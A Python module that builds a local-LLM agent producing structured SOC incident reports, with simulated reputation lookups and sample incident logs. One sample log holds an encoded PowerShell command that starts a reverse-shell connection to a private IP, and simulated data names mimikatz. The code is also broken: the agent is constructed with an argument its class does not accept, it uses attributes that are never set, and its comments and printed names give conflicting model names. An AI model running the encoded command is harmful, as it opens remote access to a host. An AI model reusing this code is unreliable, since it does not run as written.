"""
Pydantic AI Integration for Enhanced SOC Reporting

This module implements a structured SOC report generation system using Pydantic AI
and Context7 integration. It provides evidence-based security incident analysis with
actionable recommendations aligned with security frameworks.

Features:
- Structured data models for incident analysis
- Dependency injection for flexible tool usage
- Integration with security frameworks via Context7
- Rich report generation with evidence-based recommendations
- Built-in domain/IP reputation checking
- Local LLM support via Ollama
"""

import os
import json
import asyncio
import requests
from typing import Dict, List, Optional, Any, Union, Literal
from datetime import datetime

from pydantic import BaseModel, Field
try:
    from pydantic_ai import Agent, AgentConfig
except ImportError:
    print("Pydantic AI package not found. Installing...")
    import subprocess
    subprocess.check_call(["pip", "install", "pydantic-ai"])
    from pydantic_ai import Agent, AgentConfig

# Import our Context7 integration
from context7_integration import Context7Integration


# Define structured output models
class TechniqueDetails(BaseModel):
    """Details about a specific MITRE ATT&CK technique identified in the incident"""
    technique_id: str = Field(description="MITRE ATT&CK technique ID (e.g., T1078)")
    technique_name: str = Field(description="MITRE ATT&CK technique name")
    evidence: List[str] = Field(description="List of evidence from logs/data supporting this technique identification")
    confidence: Literal["Low", "Medium", "High"] = Field(description="Confidence level in this technique identification")


class ActionRecommendation(BaseModel):
    """Detailed recommendation for immediate action based on incident analysis"""
    description: str = Field(description="Detailed description of the recommended action")
    evidence: List[str] = Field(description="Specific evidence from logs/data supporting this recommendation")
    priority: Literal["Low", "Medium", "High", "Critical"] = Field(description="Priority level for this action")
    specific_commands: Optional[List[str]] = Field(description="Specific commands or steps to execute this action", default=None)
    expected_outcome: str = Field(description="Expected outcome of performing this action")
    security_framework_alignment: Optional[str] = Field(description="How this aligns with security frameworks (MITRE, NIST, etc.)", default=None)


class InvestigationStep(BaseModel):
    """Detailed next step for further investigation of the incident"""
    description: str = Field(description="Detailed description of the investigation step")
    rationale: str = Field(description="Why this step is important based on current evidence")
    tools: List[str] = Field(description="Specific tools recommended for this investigation step")
    data_sources: List[str] = Field(description="Data sources to examine during this step")
    expected_findings: str = Field(description="What findings might result from this investigation")
    techniques_addressed: Optional[List[str]] = Field(description="MITRE ATT&CK techniques this step helps investigate", default=None)


class IncidentAnalysisOutput(BaseModel):
    """Comprehensive incident analysis output with structured recommendations"""
    incident_id: str = Field(description="Incident identifier")
    severity: Literal["Low", "Medium", "High", "Critical"] = Field(description="Assessed severity of the incident")
    incident_title: str = Field(description="Short, descriptive title for the incident")
    executive_summary: str = Field(description="Brief summary of the incident and key findings")
    identified_techniques: List[TechniqueDetails] = Field(description="MITRE ATT&CK techniques identified in the incident")
    immediate_actions: List[ActionRecommendation] = Field(description="Prioritized list of immediate actions to take")
    future_steps: List[InvestigationStep] = Field(description="Recommended next steps for investigation")
    related_incidents: Optional[List[str]] = Field(description="Related incident IDs that may be connected", default=None)
    timeline: Optional[Dict[str, str]] = Field(description="Timeline of key events in the incident", default=None)


class OllamaLLMConfig:
    """Configuration for Ollama LLM"""
    
    def __init__(self, model: str = "llama3", host: str = "localhost", port: int = 11434):
        self.model = model
        self.base_url = f"http://{host}:{port}/api"
        
    def get_completion(self, prompt: str, system_prompt: Optional[str] = None, 
                      temperature: float = 0.2, max_tokens: int = 4096) -> str:
        """Get a completion from Ollama"""
        url = f"{self.base_url}/generate"
        
        payload = {
            "model": self.model,
            "prompt": prompt,
            "temperature": temperature,
            "max_tokens": max_tokens
        }
        
        if system_prompt:
            payload["system"] = system_prompt
            
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            return response.json().get("response", "")
        except requests.exceptions.RequestException as e:
            print(f"Error calling Ollama API: {e}")
            return f"Error: {e}"
            
    async def get_completion_async(self, prompt: str, system_prompt: Optional[str] = None,
                                  temperature: float = 0.2, max_tokens: int = 4096) -> str:
        """Get a completion from Ollama asynchronously"""
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, 
            lambda: self.get_completion(prompt, system_prompt, temperature, max_tokens)
        )


# Custom Ollama-powered agent for Pydantic AI
class OllamaAgent:
    """Agent for interacting with Ollama local LLMs"""
    
    def __init__(self, model: str = "deepseek-r1:7b", host: str = "localhost", port: int = 11434):
        self.model = model
        self.base_url = f"http://{host}:{port}/api"
        print(f"Initialized Ollama agent with model: {model}")
        
    async def run(self, system_prompt: str, prompt: str) -> Any:
        """Run the agent with the given prompts"""
        
        combined_prompt = f"""
I need you to analyze this security incident and provide a structured output according to this JSON schema:

{self.output_model.schema_json(indent=2)}

The output should be valid JSON that follows this schema exactly.

Here's the incident information:

{prompt}
"""
        
        # Get completion from Ollama
        response_text = await self.llm.get_completion_async(combined_prompt, system_prompt)
        
        # Try to parse the response as JSON
        try:
            # Extract JSON from the response if needed
            json_start = response_text.find('{')
            json_end = response_text.rfind('}') + 1
            
            if json_start != -1 and json_end != -1:
                json_text = response_text[json_start:json_end]
                response_data = json.loads(json_text)
                return self.output_model.parse_obj(response_data)
            else:
                # Fallback approach - try to extract structured data from text
                print("Warning: Could not find JSON in response. Using fallback parser.")
                return self._fallback_parser(response_text)
                
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")
            return self._fallback_parser(response_text)
        except Exception as e:
            print(f"Error parsing response: {e}")
            raise
            
    def _fallback_parser(self, text: str) -> Any:
        """Fallback parser for when JSON parsing fails"""
        # Create a minimal valid object
        print("Using fallback parser. Response may be incomplete.")
        
        # Extract what we can from the text response
        lines = text.split('\n')
        
        # Try to extract key information
        incident_id = "UNKNOWN"
        severity = "Medium"
        title = "Security Incident Analysis"
        summary = ""
        
        for line in lines:
            if "incident id" in line.lower() or "incident number" in line.lower():
                incident_id = line.split(":")[-1].strip()
            elif "severity" in line.lower():
                if "high" in line.lower():
                    severity = "High"
                elif "critical" in line.lower():
                    severity = "Critical"
                elif "low" in line.lower():
                    severity = "Low"
            elif "title" in line.lower() or "summary" in line.lower():
                title = line.split(":")[-1].strip()
            
            # Collect lines that might be part of the summary
            if not line.startswith('#') and len(line) > 20:
                summary += line + "\n"
                if len(summary) > 200:
                    break
        
        # Create a minimal valid response
        return self.output_model(
            incident_id=incident_id,
            severity=severity,
            incident_title=title,
            executive_summary=summary[:500],  # Truncate if needed
            identified_techniques=[
                TechniqueDetails(
                    technique_id="T0000",
                    technique_name="Unknown Technique",
                    evidence=["Limited analysis available"],
                    confidence="Low"
                )
            ],
            immediate_actions=[
                ActionRecommendation(
                    description="Review the incident details manually",
                    evidence=["Automated analysis incomplete"],
                    priority="Medium",
                    expected_outcome="Better understanding of the incident"
                )
            ],
            future_steps=[
                InvestigationStep(
                    description="Perform manual investigation of the incident",
                    rationale="Automated analysis provided limited results",
                    tools=["Log analysis tools", "SIEM"],
                    data_sources=["Security logs", "Network traffic"],
                    expected_findings="Complete understanding of the incident"
                )
            ]
        )


# Create the Agent with the output model - using Ollama instead of OpenAI
agent = OllamaAgent(
    output_model=IncidentAnalysisOutput,
    model="deepseek-r1:7b"  # Using Llama 3 model
)


class IncidentDependencies:
    """Dependencies for incident analysis"""
    
    def __init__(self):
        self.context7 = Context7Integration()
        self._domain_reputation_cache = {}
        self._initialized = False
        
    async def initialize(self):
        """Initialize all dependencies"""
        if self._initialized:
            return
        
        await self.context7.initialize()
        self._initialized = True
        
    async def get_framework_guidance(self, incident_topic: str) -> Dict[str, str]:
        """Get security framework guidance for an incident topic"""
        if not self._initialized:
            await self.initialize()
            
        return await self.context7.get_documentation(incident_topic)
    
    async def check_domain_reputation(self, domain: str) -> Dict[str, Any]:
        """Check reputation of a domain"""
        # Check cache first
        if domain in self._domain_reputation_cache:
            return self._domain_reputation_cache[domain]
            
        # This would normally call a real reputation API
        # For demonstration, we'll simulate responses
        
        high_risk_domains = ["evilcorp.com", "malware-domain.net", "phishing-site.org"]
        medium_risk_domains = ["suspicious-domain.com", "new-domain-2023.net"]
        
        if domain in high_risk_domains:
            reputation = {
                "domain": domain,
                "risk_score": 85,
                "categories": ["malware", "phishing"],
                "first_seen": "2023-01-15",
                "registrar": "Suspicious Registrar Ltd",
                "recommendation": "Block immediately and investigate all connections"
            }
        elif domain in medium_risk_domains or "temp" in domain or "free" in domain:
            reputation = {
                "domain": domain,
                "risk_score": 65,
                "categories": ["newly_registered", "suspicious"],
                "first_seen": "2023-09-12",
                "registrar": "Domain Registry Inc",
                "recommendation": "Monitor closely and consider blocking"
            }
        else:
            reputation = {
                "domain": domain,
                "risk_score": 15,
                "categories": ["business", "legitimate"],
                "first_seen": "2020-05-03",
                "registrar": "Major Registrar Inc",
                "recommendation": "No action needed"
            }
            
        # Cache the result
        self._domain_reputation_cache[domain] = reputation
        return reputation
        
    async def summarize_user_activity(self, user_id: str, timeframe_hours: int = 24) -> Dict[str, Any]:
        """Summarize user activity for the specified timeframe"""
        # This would normally query actual user activity logs
        # For demonstration, we'll return simulated data
        
        suspicious_users = ["jsmith", "admin2", "tempuser"]
        
        if user_id in suspicious_users:
            return {
                "user_id": user_id,
                "login_count": 12,
                "unique_ips": 4,
                "unusual_hours_activity": True,
                "accessed_sensitive_resources": True,
                "authentication_failures": 3,
                "unusual_commands_executed": ["net user administrator", "mimikatz"],
                "risk_score": 85
            }
        else:
            return {
                "user_id": user_id,
                "login_count": 2,
                "unique_ips": 1,
                "unusual_hours_activity": False,
                "accessed_sensitive_resources": False,
                "authentication_failures": 0,
                "unusual_commands_executed": [],
                "risk_score": 15
            }


def extract_security_indicators(incident_data: Dict[str, Any], logs: List[Dict[str, Any]]) -> Dict[str, List[str]]:
    """
    Extract security indicators from incident data and logs
    
    Args:
        incident_data: Dictionary containing incident details
        logs: List of log entries related to the incident
        
    Returns:
        Dictionary with categorized security indicators
    """
    # This would normally parse actual incident data and logs
    # For demonstration, we'll extract some sample indicators
    
    indicators = {
        "ip_addresses": [],
        "domains": [],
        "users": [],
        "hashes": []
    }
    
    # Extract from incident data
    if "entities" in incident_data:
        for entity in incident_data["entities"]:
            if "Address" in entity and entity["Address"]:
                indicators["ip_addresses"].append(entity["Address"])
            if "Account" in entity and entity["Account"]:
                indicators["users"].append(entity["Account"])
                
    # Extract from logs
    for log in logs:
        if "src_ip" in log and log["src_ip"]:
            indicators["ip_addresses"].append(log["src_ip"])
        if "dest_ip" in log and log["dest_ip"]:
            indicators["ip_addresses"].append(log["dest_ip"])
        if "domain" in log and log["domain"]:
            indicators["domains"].append(log["domain"])
        if "user" in log and log["user"]:
            indicators["users"].append(log["user"])
        if "file_hash" in log and log["file_hash"]:
            indicators["hashes"].append(log["file_hash"])
            
    # Remove duplicates
    for category in indicators:
        indicators[category] = list(set(indicators[category]))
        
    return indicators


def generate_system_prompt(incident_data: Dict[str, Any], 
                          indicators: Dict[str, List[str]], 
                          logs_summary: str,
                          framework_guidance: Dict[str, str]) -> str:
    """
    Generate the system prompt for the SOC analyst report
    
    Args:
        incident_data: Dictionary containing incident details
        indicators: Extracted security indicators
        logs_summary: Summary of relevant logs
        framework_guidance: Security framework guidance for this incident
        
    Returns:
        System prompt for the LLM
    """
    prompt = """You are an expert SOC analyst tasked with analyzing a security incident. Your primary responsibility 
is to provide a comprehensive, evidence-based analysis with specific, technically precise recommendations.

Focus on concrete evidence from the logs and incident data. Provide technically accurate, actionable recommendations 
that include specific commands and tools. Include specific indicators (IPs, domains, hashes, users) in your recommendations.

Your analysis should be detailed enough that any SOC analyst could immediately implement your recommendations.
"""

    # Add incident context
    prompt += "\n\nIncident Details:\n"
    prompt += f"Incident ID: {incident_data.get('IncidentNumber', 'Unknown')}\n"
    prompt += f"Title: {incident_data.get('Title', 'Unknown')}\n"
    prompt += f"Severity: {incident_data.get('Severity', 'Unknown')}\n"
    prompt += f"Status: {incident_data.get('Status', 'Unknown')}\n"
    prompt += f"Created: {incident_data.get('CreatedTimeUtc', 'Unknown')}\n"
    
    # Add security indicators
    prompt += "\n\nExtracted Security Indicators:\n"
    for category, items in indicators.items():
        if items:
            prompt += f"\n{category.upper()}:\n"
            for item in items:
                prompt += f"- {item}\n"
    
    # Add logs summary
    prompt += f"\n\nLogs Summary:\n{logs_summary}\n"
    
    # Add framework guidance
    if framework_guidance.get("mitre_guidance"):
        prompt += f"\n\nMITRE ATT&CK Guidance:\n{framework_guidance['mitre_guidance']}\n"
        
    if framework_guidance.get("owasp_guidance"):
        prompt += f"\n\nOWASP Guidance:\n{framework_guidance['owasp_guidance']}\n"
    
    prompt += """
Your analysis must include:
1. A severity assessment based on the evidence
2. Specific MITRE ATT&CK techniques identified with supporting evidence
3. Prioritized immediate actions with specific commands and tools
4. Detailed future investigation steps with expected outcomes
5. Potential related incidents that should be investigated

Each recommendation must include the specific evidence that led to it and the technical steps to implement it.
"""
    
    return prompt


async def generate_soc_analyst_report(incident_data: Dict[str, Any], logs: List[Dict[str, Any]]) -> IncidentAnalysisOutput:
    """
    Generate a comprehensive SOC analyst report for a security incident
    
    Args:
        incident_data: Dictionary containing incident details
        logs: List of log entries related to the incident
        
    Returns:
        IncidentAnalysisOutput with structured analysis and recommendations
    """
    # Initialize dependencies
    dependencies = IncidentDependencies()
    await dependencies.initialize()
    
    # Extract security indicators
    indicators = extract_security_indicators(incident_data, logs)
    
    # Create a logs summary
    logs_summary = "Key log events:\n"
    for i, log in enumerate(logs[:10]):  # Limit to first 10 logs for brevity
        log_entry = f"[{log.get('timestamp', 'Unknown')}] "
        if "event_type" in log:
            log_entry += f"Type: {log['event_type']} "
        if "src_ip" in log and "dest_ip" in log:
            log_entry += f"Connection: {log['src_ip']} → {log['dest_ip']} "
        if "user" in log:
            log_entry += f"User: {log['user']} "
        if "message" in log:
            log_entry += f"Message: {log['message']}"
        logs_summary += f"{log_entry}\n"
    
    # Get framework guidance
    incident_topic = incident_data.get("Title", "") + " " + incident_data.get("Description", "")
    framework_guidance = await dependencies.get_framework_guidance(incident_topic)
    
    # Generate system prompt
    system_prompt = generate_system_prompt(incident_data, indicators, logs_summary, framework_guidance)
    
    # Generate user prompt
    user_prompt = f"""Please analyze this security incident and provide a comprehensive report.

Incident Title: {incident_data.get('Title', 'Unknown')}
Description: {incident_data.get('Description', 'Unknown')}

Focus on providing technical, actionable recommendations based on the evidence in the logs and incident data.
Include specific commands, tools, and procedures for each recommendation."""

    # Generate the report using the Ollama agent
    result = await agent.run(
        system_prompt=system_prompt,
        prompt=user_prompt
    )
    
    return result


def format_soc_analyst_report(report: IncidentAnalysisOutput) -> str:
    """
    Format the SOC analyst report for display
    
    Args:
        report: IncidentAnalysisOutput from the SOC analyst report generation
        
    Returns:
        Formatted report as a string
    """
    formatted_report = f"""
SECURITY INCIDENT REPORT: {report.incident_title}
=====================================================
Incident ID: {report.incident_id}
Severity: {report.severity}

EXECUTIVE SUMMARY
----------------
{report.executive_summary}

IDENTIFIED TECHNIQUES
--------------------
"""

    for technique in report.identified_techniques:
        formatted_report += f"\n• {technique.technique_id}: {technique.technique_name} (Confidence: {technique.confidence})\n"
        formatted_report += "  Evidence:\n"
        for evidence in technique.evidence:
            formatted_report += f"  - {evidence}\n"

    formatted_report += "\n\nIMMEDIATE ACTIONS\n----------------\n"
    
    for i, action in enumerate(report.immediate_actions, 1):
        formatted_report += f"\n{i}. {action.description} (Priority: {action.priority})\n"
        formatted_report += "   Evidence:\n"
        for evidence in action.evidence:
            formatted_report += f"   - {evidence}\n"
        
        if action.specific_commands:
            formatted_report += "   Commands/Steps:\n"
            for cmd in action.specific_commands:
                formatted_report += f"   $ {cmd}\n"
        
        formatted_report += f"   Expected outcome: {action.expected_outcome}\n"
        
        if action.security_framework_alignment:
            formatted_report += f"   Framework alignment: {action.security_framework_alignment}\n"

    formatted_report += "\n\nFUTURE INVESTIGATION STEPS\n------------------------\n"
    
    for i, step in enumerate(report.future_steps, 1):
        formatted_report += f"\n{i}. {step.description}\n"
        formatted_report += f"   Rationale: {step.rationale}\n"
        
        formatted_report += "   Tools: "
        formatted_report += ", ".join(step.tools) + "\n"
        
        formatted_report += "   Data sources: "
        formatted_report += ", ".join(step.data_sources) + "\n"
        
        formatted_report += f"   Expected findings: {step.expected_findings}\n"
        
        if step.techniques_addressed:
            formatted_report += "   Techniques addressed: "
            formatted_report += ", ".join(step.techniques_addressed) + "\n"

    if report.related_incidents:
        formatted_report += "\n\nRELATED INCIDENTS\n----------------\n"
        for incident in report.related_incidents:
            formatted_report += f"- {incident}\n"

    if report.timeline:
        formatted_report += "\n\nINCIDENT TIMELINE\n----------------\n"
        for time, event in report.timeline.items():
            formatted_report += f"{time}: {event}\n"

    return formatted_report


async def main():
    """Main function to run the SOC agent"""
    print("Initializing SOC Agent with Ollama (deepseek-r1:7b model)...")
    
    # Initialize the Ollama agent
    agent = OllamaAgent(model="deepseek-r1:7b")
    
    # Sample incident data (in a real scenario, this would come from Azure Sentinel)
    sample_incident = {
        "IncidentNumber": "INC-2023-12345",
        "Title": "Suspicious authentication activity from multiple locations",
        "Description": "Multiple failed login attempts followed by successful login from unusual location",
        "Severity": "High",
        "Status": "New",
        "CreatedTimeUtc": "2023-12-15T10:25:13Z",
        "entities": [
            {"Account": "jhenderson", "Address": "192.168.1.105"},
            {"Account": "system", "Address": "10.0.0.15"},
            {"AccountName": "administrator", "Address": "203.0.113.25"}
        ]
    }
    
    # Sample logs (in a real scenario, these would be fetched from log analytics)
    sample_logs = [
        {
            "timestamp": "2023-12-15T10:15:03Z",
            "event_type": "authentication_failure",
            "src_ip": "203.0.113.25",
            "dest_ip": "10.0.0.15",
            "user": "jhenderson",
            "message": "Failed login attempt - invalid password"
        },
        {
            "timestamp": "2023-12-15T10:16:12Z",
            "event_type": "authentication_failure",
            "src_ip": "203.0.113.25",
            "dest_ip": "10.0.0.15",
            "user": "jhenderson",
            "message": "Failed login attempt - invalid password"
        },
        {
            "timestamp": "2023-12-15T10:17:45Z",
            "event_type": "authentication_success",
            "src_ip": "203.0.113.25",
            "dest_ip": "10.0.0.15",
            "user": "jhenderson",
            "message": "Successful login"
        },
        {
            "timestamp": "2023-12-15T10:18:22Z",
            "event_type": "privilege_escalation",
            "src_ip": "10.0.0.15",
            "user": "jhenderson",
            "message": "User added to administrators group"
        },
        {
            "timestamp": "2023-12-15T10:19:07Z",
            "event_type": "process_creation",
            "src_ip": "10.0.0.15",
            "user": "jhenderson",
            "process": "powershell.exe",
            "command_line": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAANQAiACwANAA0ADMANQAPAA==",
            "message": "PowerShell execution with encoded command"
        },
        {
            "timestamp": "2023-12-15T10:20:33Z",
            "event_type": "network_connection",
            "src_ip": "10.0.0.15",
            "dest_ip": "192.168.1.105",
            "dest_port": 4433,
            "protocol": "TCP",
            "message": "Outbound connection established"
        },
        {
            "timestamp": "2023-12-15T10:22:14Z",
            "event_type": "file_creation",
            "src_ip": "10.0.0.15",
            "user": "jhenderson",
            "file_path": "C:\\Windows\\Temp\\svhost.exe",
            "file_hash": "5f2b7a2f3d6a2a2d29d3b5a2f2d6a7b8",
            "message": "Suspicious file created in Temp directory"
        },
        {
            "timestamp": "2023-12-15T10:24:02Z",
            "event_type": "dns_request",
            "src_ip": "10.0.0.15",
            "domain": "evilcommand.example.com",
            "message": "DNS request to suspicious domain"
        }
    ]
    
    # Generate the SOC analyst report
    print("Generating SOC analyst report using Ollama Llama 3.2...")
    soc_report = await generate_soc_analyst_report(sample_incident, sample_logs)
    
    # Format and print the report
    formatted_report = format_soc_analyst_report(soc_report)
    print(formatted_report)
    
    # Save the report to a file
    try:
        filename = f"incident_{sample_incident['IncidentNumber']}_report.txt"
        with open(filename, "w") as f:
            f.write(formatted_report)
        print(f"\nReport saved to {filename}")
    except Exception as e:
        print(f"Error saving report to file: {e}")


if __name__ == "__main__":
    # Run the main function with Ollama LLM
    asyncio.run(main()) 